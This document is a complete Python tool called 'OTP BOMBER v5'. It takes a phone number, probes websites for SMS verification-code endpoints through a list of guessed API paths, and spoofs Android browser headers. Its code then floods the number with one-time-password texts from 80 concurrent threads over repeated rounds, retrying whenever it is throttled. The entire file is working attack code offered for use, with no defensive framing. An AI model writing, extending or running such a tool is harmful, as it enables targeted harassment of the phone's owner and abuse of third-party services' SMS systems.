#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OTP BOMBER v5
=============
Enter phone number -> enter rounds -> done.

New in v5:
  * verdict() honest: HTML page is not an API (kills catch-all false positives)
  * 429 is "throttled" and retried, not counted as success
  * captcha detected
  * {phone_local} placeholder -> sends 0501234567 for sites that want local format
  * per-endpoint cooldown (COOLDOWN)

sites.txt line format:
    https://site.com/api/send-otp|POST|{"phone":"{phone}"}
    https://site.com/customer/ajax/post/|POST|telephone={phone_local}
    site.com|/api/auth/otp            (tool hunts the rest)
    domain.com                        (tool hunts everything)
"""

import json
import os
import re
import sys
import threading
import time
from concurrent.futures import (ThreadPoolExecutor, as_completed, wait,
                                FIRST_COMPLETED)
from urllib.parse import quote

import requests

# ----------------- settings -----------------
WORKERS       = 80
ROUND_SECONDS = 30
TIMEOUT       = 10
COUNTRY_CODE  = "972"
PROBE_LIMIT   = 40      # must be >= len(PROBE_PATHS)
COOLDOWN      = 1.0     # seconds between two requests to the SAME endpoint
LOCAL_PHONE   = ""      # filled at runtime, e.g. 0501234567

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")


def app_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


HERE = app_dir()
SITES_FILE = os.path.join(HERE, "sites.txt")
ALIVE_FILE = os.path.join(HERE, "alive.json")

PROBE_PATHS = [
    "/api/auth/send-otp", "/api/auth/otp", "/api/send-otp", "/api/otp/send",
    "/api/v1/auth/otp", "/api/v1/send-otp", "/api/v1/auth/send-otp",
    "/api/v2/auth/otp", "/auth/send-otp", "/auth/otp", "/send-otp",
    "/otp/send", "/api/send-code", "/api/user/send-otp",
    "/api/v1/otp/send", "/api/v1/sms/send", "/api/v1/user/send-otp",
    "/api/v1/phone/send-code", "/api/v1/auth/sms", "/api/v1/auth/send-code",
    "/api/v1/user/otp", "/api/v1/verify/send",
    "/api/v2/otp/send", "/api/v2/auth/sms", "/api/v2/sms/send",
    "/api/v2/send-otp", "/api/v2/user/send-otp",
    "/user/send-otp", "/auth/phone/send", "/auth/sms", "/sms/send",
    "/api/sms/send", "/api/auth/sms", "/api/auth/send-code",
    "/api/user/send-code", "/api/phone/send-code", "/api/verify/send",
]

BAD_WORDS = ('"error"', '"success":false', '"status":false', '"ok":false',
             '"valid":false', '"result":false', "invalid", "required",
             "not found", "expired", "too many", "not exist", "missing",
             "unknown", "unrecognized")
OTP_WORDS = ("otp", "verification code", "one time", "one-time",
             "send sms", "sent", "verification")


# ----------------- helpers -----------------
def norm_phones(raw):
    """returns international variants, most likely first"""
    p = re.sub(r"[^\d]", "", raw)
    if p.startswith(COUNTRY_CODE):
        intl = p
    elif p.startswith("0"):
        intl = COUNTRY_CODE + p[1:]
    else:
        intl = COUNTRY_CODE + p if len(p) <= 9 else p
    return [intl, "+" + intl]


_local = threading.local()


def sess():
    s = getattr(_local, "s", None)
    if s is None:
        s = requests.Session()
        _local.s = s
    return s


def headers_for(url):
    try:
        base = re.match(r"https?://[^/]+", url).group(0)
    except Exception:
        base = url
    return {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": base,
        "Referer": base + "/",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    }


def parse_line(line):
    """-> list of dicts(url, method, payload) or None"""
    parts = [x.strip() for x in line.split("|")]
    first = parts[0]
    if not first:
        return None

    method, payload, path = None, "", None
    if len(parts) > 1 and parts[1]:
        if parts[1].upper() in ("POST", "GET", "PUT"):
            method = parts[1].upper()
            payload = parts[2] if len(parts) > 2 else ""
        elif parts[1].startswith("/"):
            path = parts[1]
            payload = parts[2] if len(parts) > 2 else ""
        else:
            payload = parts[1]

    if not first.startswith("http"):
        first = "https://" + first
    first = first.rstrip("/")

    if path:
        urls = [first + path] + [first + p for p in PROBE_PATHS[:PROBE_LIMIT]]
    elif first.count("/") == 2:
        urls = [first + p for p in PROBE_PATHS[:PROBE_LIMIT]]
    else:
        urls = [first]

    out = []
    for u in urls:
        out.append({
            "url": u,
            "method": method or ("GET" if "{phone" in u else "POST"),
            "payload": payload or '{"phone":"{phone}"}',
        })
    return out


def load_sites():
    entries = []
    with open(SITES_FILE, encoding="utf-8") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            got = parse_line(line)
            if got:
                entries.extend(got)
    return entries


# ----------------- the actual request -----------------
def fire(ep, phone):
    local = LOCAL_PHONE or phone
    url = (ep["url"].replace("{phone_local}", local)
                    .replace("{phone}", quote(phone, safe="")))
    payload = (ep.get("payload") or "")
    payload = payload.replace("{phone_local}", local).replace("{phone}", phone)
    h = headers_for(ep["url"])
    method = ep.get("method", "POST").upper()
    try:
        if method == "GET":
            return sess().get(url, headers=h, timeout=TIMEOUT)
        if payload.strip().startswith("{"):
            h["Content-Type"] = "application/json"
            return sess().post(url, data=payload.encode(), headers=h,
                               timeout=TIMEOUT)
        if "=" in payload:
            h["Content-Type"] = "application/x-www-form-urlencoded"
            return sess().post(url, data=payload, headers=h, timeout=TIMEOUT)
        h["Content-Type"] = "application/json"
        return sess().post(url, json={"phone": phone}, headers=h,
                           timeout=TIMEOUT)
    except Exception:
        return None


def verdict(r):
    """live = really sent | maybe = endpoint exists | dead = nothing there"""
    if r is None:
        return "dead"
    c = r.status_code
    if c in (404, 405, 410):
        return "dead"

    ct = (r.headers.get("content-type") or "").lower()
    body = r.text or ""
    low = body.lower()

    if c == 429:
        return "throttled"
    if "captcha" in low or "recaptcha" in low:
        return "maybe"
    if c in (400, 401, 403, 422):
        return "maybe"
    if not (200 <= c < 300):
        return "dead"

    # big HTML page = the site's homepage / SPA catch-all
    if "html" in ct:
        if len(body) > 1500:
            return "dead"
        return "maybe" if any(w in low for w in OTP_WORDS) else "dead"

    if "json" in ct:
        return "maybe" if any(b in low for b in BAD_WORDS) else "live"

    if any(w in low for w in OTP_WORDS):
        return "live"
    return "maybe"


# ----------------- discovery -----------------
def discover(entries):
    phones = PHONES
    alive, near = [], []
    done = 0
    total = len(entries)
    print(f"\n[*] Testing {total} endpoints...\n")
    t0 = time.time()

    def check(ep):
        for ph in phones:
            for attempt in range(3):
                v = verdict(fire(ep, ph))
                if v == "throttled" and attempt < 2:
                    time.sleep(2.5)
                    continue
                if v in ("live", "throttled"):
                    return ("LIVE", ep, ph)
                if v == "maybe":
                    near.append((ep, ph))
                break
        return ("DEAD", ep, phones[0])

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(check, e) for e in entries]
        for fut in as_completed(futs):
            done += 1
            kind, ep, ph = fut.result()
            if kind == "LIVE":
                alive.append({**ep, "phone": ph})
                print(f"  + {ep['url']}")
            if done % 50 == 0:
                print(f"    ... {done}/{total}  ({time.time() - t0:.0f}s)")

    print(f"\n[*] LIVE: {len(alive)}   |   near-miss: {len(near)}   "
          f"|   {time.time() - t0:.0f}s\n")
    if alive:
        with open(ALIVE_FILE, "w", encoding="utf-8") as f:
            json.dump(alive, f, ensure_ascii=False, indent=1)
    return alive


# ----------------- rounds -----------------
def run_round(endpoints, budget):
    deadline = time.time() + budget
    st = {"sent": 0, "ok": 0, "thr": 0, "fail": 0}
    n = len(endpoints)
    nxt = [0.0] * n
    idx = 0
    ex = ThreadPoolExecutor(max_workers=WORKERS)
    pending = {}
    last = time.time()

    try:
        while True:
            now = time.time()
            while len(pending) < WORKERS and now < deadline:
                picked = False
                for _ in range(n):
                    i = idx % n
                    idx += 1
                    if nxt[i] <= now:
                        nxt[i] = now + COOLDOWN
                        e = endpoints[i]
                        pending[ex.submit(fire, e,
                                          e.get("phone", PHONES[0]))] = i
                        picked = True
                        break
                if not picked:
                    break
                now = time.time()

            if not pending:
                if time.time() >= deadline:
                    break
                time.sleep(0.02)
                continue

            done, _ = wait(list(pending.keys()), timeout=0.1,
                           return_when=FIRST_COMPLETED)
            for f in done:
                i = pending.pop(f, None)
                st["sent"] += 1
                r = f.result()
                if r is None:
                    st["fail"] += 1
                elif 200 <= r.status_code < 300:
                    st["ok"] += 1
                elif r.status_code == 429:
                    st["thr"] += 1
                    if i is not None:
                        nxt[i] = time.time() + COOLDOWN * 3
                else:
                    st["fail"] += 1

            if time.time() - last >= 1.0:
                last = time.time()
                left = max(0.0, deadline - time.time())
                print(f"\r      {left:4.1f}s left   sent {st['sent']}   "
                      f"ok {st['ok']}   throttled {st['thr']}",
                      end="", flush=True)

            if time.time() >= deadline and not pending:
                break
    finally:
        ex.shutdown(wait=False)
    print()
    return st


def main():
    print("=" * 56)
    print("               O T P   B O M B E R   v5")
    print("=" * 56)

    if not os.path.exists(SITES_FILE):
        print(f"\n[X] sites.txt not found.\n    expected here: {SITES_FILE}")
        input("\nPress Enter to exit...")
        return

    raw = input("\nEnter phone number: ").strip()
    if not raw:
        return
    global PHONES, LOCAL_PHONE
    PHONES = norm_phones(raw)
    LOCAL_PHONE = "0" + PHONES[0][len(COUNTRY_CODE):]
    print(f"    -> will send as: {PHONES[0]}   (local: {LOCAL_PHONE})")

    try:
        rounds = max(1, int(input("How many rounds: ").strip() or "1"))
    except ValueError:
        rounds = 1

    alive = None
    if os.path.exists(ALIVE_FILE) and \
            os.path.getmtime(ALIVE_FILE) >= os.path.getmtime(SITES_FILE):
        try:
            with open(ALIVE_FILE, encoding="utf-8") as f:
                alive = json.load(f)
            print(f"[*] Reusing last scan: {len(alive)} live endpoints "
                  f"(delete alive.json to rescan)")
        except Exception:
            alive = None

    if not alive:
        alive = discover(load_sites())
    if not alive:
        print("[X] nothing alive.")
        input("\nPress Enter to exit...")
        return

    print(f"[*] {rounds} rounds x {ROUND_SECONDS}s = "
          f"{rounds * ROUND_SECONDS}s of firing. Ctrl+C to stop.\n")

    t0 = time.time()
    tot = {"ok": 0, "sent": 0, "thr": 0}
    for r in range(1, rounds + 1):
        print(f"  Round {r}/{rounds}")
        st = run_round(alive, ROUND_SECONDS)
        for k in tot:
            tot[k] += st[k]
        print(f"    -> sent {st['sent']}   ok {st['ok']}   "
              f"throttled {st['thr']}   fail {st['fail']}\n")

    el = time.time() - t0
    print("=" * 56)
    print(f"  requests sent   : {tot['sent']}")
    print(f"  successful SMS  : {tot['ok']}")
    print(f"  throttled (429) : {tot['thr']}")
    print(f"  time            : {el:.0f}s")
    if el:
        print(f"  speed           : {tot['ok'] / el:.1f} sms/sec")
    print("=" * 56)
    input("\nPress Enter to exit...")


PHONES = ["972"]

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nbye.")
